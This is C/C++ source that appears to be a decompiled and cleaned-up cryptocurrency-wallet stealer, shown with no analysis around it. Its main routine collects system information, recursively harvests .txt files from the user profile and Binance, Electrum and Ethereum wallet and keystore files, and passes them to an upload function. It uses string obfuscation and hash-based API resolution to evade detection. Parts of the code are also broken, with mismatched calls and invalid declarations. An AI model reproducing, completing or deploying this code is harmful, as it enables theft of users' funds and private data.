#include "Header.h"

void allocateMemory(int16_t flag, void** buffer)
{
    int32_t status = 1;
    int32_t actionFlag = flag;
    void* memoryBlock = allocateMemoryBlock();

    if (!memoryBlock)
        memoryBlock = nullptr;
    else
    {
        *(uint32_t*)((char*)memoryBlock + 0x50) = 6;

        if (!performMemoryCheck(memoryBlock))
        {
            _free(memoryBlock);
            memoryBlock = nullptr;
        }
    }

    int32_t someValue = 8;
    void** result = fetchResult();
    *(uint32_t*)buffer = memoryBlock;
    result[1] = actionFlag;
    *(uint32_t*)result = memoryBlock;
    int32_t resultValue = result[1];
    buffer[1] = resultValue;

    return resultValue;
}

int32_t performMemoryCheck(void* arg)
{
    void* tempArg = arg;
    int32_t result = 0;
    *(uint32_t*)((char*)arg + 0x3c) = SomeFuncCheck;
    *(uint32_t*)((char*)arg + 0x40) = 0;
    *(uint32_t*)((char*)arg + 0x44) = arg;

    if (isMemoryValid(arg))
    {
        *(uint32_t*)((char*)arg + 0x18) = 3;
        int32_t allocationResult = (*(uint32_t*)((char*)arg + 0x28))(*(uint32_t*)((char*)arg + 0x34), 1, 0x400);
        *(uint32_t*)(*(uint32_t*)((char*)arg + 0x48) + 0x48) = allocationResult;

        if (allocationResult)
        {
            result = 1;
            *(uint32_t*)(*(uint32_t*)((char*)arg + 0x48) + 0x50) = 0x400;
        }
        else
        {
            releaseMemory(arg, 0);
            *(uint32_t*)((char*)arg + 0x1c) = 0x10;
        }
    }

    return result;
}

int32_t fetchResult()
{
    return requestMemoryAllocation();
}

int32_t requestMemoryAllocation(uint32_t bytesToAllocate)
{
    uint32_t dwBytes = bytesToAllocate;

    if (dwBytes <= 0xffffffe0)
    {
        if (!dwBytes)
            dwBytes += 1;

        int32_t retryCount;
        do
        {
            int32_t result = HeapAlloc(data_428644, HEAP_NONE, dwBytes);

            if (result)
                return result;

            if (!retryMemoryAllocation())
                break;

            retryCount = handleMemoryRetry(dwBytes);
        } while (retryCount);
    }

    *(uint32_t*)__errno() = 0xc;
    return 0;
}

int32_t __fastcall processPath(
    int32_t sourcePath,
    PWSTR fileExtension,
    int32_t searchPath,
    PWSTR destinationFolder,
    int32_t recursionDepth,
    int32_t** systemInfo
) {
    int32_t searchBufferSize = 260;
    int32_t allocationFlag = 2;  
    int32_t* searchBuffer = Alloc();

    void* getFullPathFunc = ResolveHashes(0x7328f505, u"kernel32.dll");
    getFullPathFunc(searchPath, searchBuffer, searchBufferSize);

    int32_t allocationFlag2 = 1;
    int32_t resultBufferSize = 0x1000;
    int32_t* resultBuffer = Alloc();

    int32_t allocationFlag3 = 1;
    int32_t listBufferSize = 0x1000;
    int32_t* listBuffer = Alloc();

    void* fileListPointer = nullptr;
    int32_t iterationCounter = 0;
    int32_t* fileList = listBuffer;

    searchFiles(&fileListPointer, fileExtension, searchPath, resultBuffer, &fileListPointer);

    void* tempFileList = fileListPointer;
    void* currentFile;

    if (fileListPointer) {
        do {
            PWSTR fileName = *(uint32_t*)resultBuffer;
            int32_t* fileDataPtr = &currentFile;
            void* tempBuffer = &resultBuffer[1];

            *(uint32_t*)fileDataPtr = *(uint32_t*)tempBuffer;
            *(uint32_t*)((char*)fileDataPtr + 4) = *(uint32_t*)((char*)tempBuffer + 4);

            int32_t fileSize;
            if (fileSize <= 0xa00000) {
                char* tempBuffer2 = nullptr;
                fileListPointer = nullptr;

                // Process the file
                processFile(&fileListPointer);

                PWSTR fullPathBuffer = Alloc();
                lstrcatW(fullPathBuffer, destinationFolder);
                lstrcatW(fullPathBuffer, L"\\");
                lstrcatW(fullPathBuffer, fileName);

                PSTR finalFilePath = convertWideToAnsi(fullPathBuffer);

                if (fileListPointer) {
                    processCollectedFile(
                        handleSystemData(*(uint32_t*)systemInfo, finalFilePath),
                        tempBuffer2, *(uint32_t*)systemInfo, fileListPointer
                    );
                    finalizeProcessing(*(uint32_t*)systemInfo);
                }
            }

            resultBuffer += 4;
            tempFileList--;
        } while (tempFileList);
    }

    if (recursionDepth > 0) {
        searchFiles(&iterationCounter, L"*", searchPath, listBuffer, &iterationCounter);

        int32_t subFolderCount = iterationCounter;
        bool hasSubFolders = subFolderCount > 0;

        while (hasSubFolders) {
            PWSTR subFolderName = *(uint32_t*)listBuffer;
            int32_t* subFolderData = &currentFile;
            void* tempSubBuffer = &listBuffer[1];

            *(uint32_t*)subFolderData = *(uint32_t*)tempSubBuffer;
            *(uint32_t*)((char*)subFolderData + 4) = *(uint32_t*)((char*)tempSubBuffer + 4);

            int32_t subFolderSize;
            if (subFolderSize) {
                PWSTR subFolderPath = Alloc();
                lstrcatW(subFolderPath, destinationFolder);
                lstrcatW(subFolderPath, L"\\");
                lstrcatW(subFolderPath, _wcsrchr(currentFile, L'\\') + 1);

                processPath(subFolderPath, recursionDepth - 1, systemInfo);
                _free(subFolderPath);
            }

            listBuffer += 4;
            subFolderCount--;
            hasSubFolders = subFolderCount > 0;
        }
    }

    _free(resultBuffer);
    return _free(listBuffer);
}


int main(){
  const WCHAR *importedFilesPath;
  const WCHAR *binanceWalletPath;
  const WCHAR *electrumWalletPath;
  const WCHAR *walletEthereumPath;
  void sharedBuffer;

  allocateMem(1, &sharedBuffer);

  CollectSystemInfo(&sharedBuffer);
  importedFilesPath = (const WCHAR *)GetFilePath((wchar_t *)L"Importedx765ant Fileedx765s/Proedx765file");
  PWSTR* extension = GetFilePath(u"*.edx765txt");
  PWSTR* userprofile = GetFilePath(u"%userproedx765file%");
  processPath(userprofile, extension, userprofile, importedFilesPath, 2, &sharedBuffer);

  PWSTR walletPathBinance = GetFilePath(L"Walledx765ets/Binanedx765ce");
  PWSTR* extensionBinance = GetFilePath(L"apedx765p-stoedx765re.jsedx765on");
  PWSTR* appDataPathBinance = GetFilePath(L"%appdaedx765ta%/Binaedx765nce");
  processPath(appDataPathBinance, extensionBinance, appDataPathBinance, walletPathBinance, 1, &SysInfo);

  PWSTR walletPathElectrum = GetFilePath(L"Walledx765ets/Eleedx765ctrum");
  PWSTR* extensionElectrum = GetFilePath(L"*edx765");
  PWSTR* appDataPathElectrum = GetFilePath(L"%appdedx765ata%/Eledx765ectrum");
  processPath(appDataPathElectrum, extensionElectrum, appDataPathElectrum, walletPathElectrum, 1, &SysInfo);

  PWSTR walletPathEthereum = GetFilePath(L"Walledx765ets/Ethedx765ereum");
  PWSTR* extensionEthereum = GetFilePath(L"keystedx765ore");
  PWSTR* appDataPathEthereum = GetFilePath(L"%appdedx765ata%/Etheedx765reum");
  processPath(appDataPathEthereum, extensionEthereum, appDataPathEthereum, walletPathEthereum, 1, &SysInfo);

  ProcessAndUploadInfo(&SysInfo);
  allocateMem(2, &SysInfo);

}
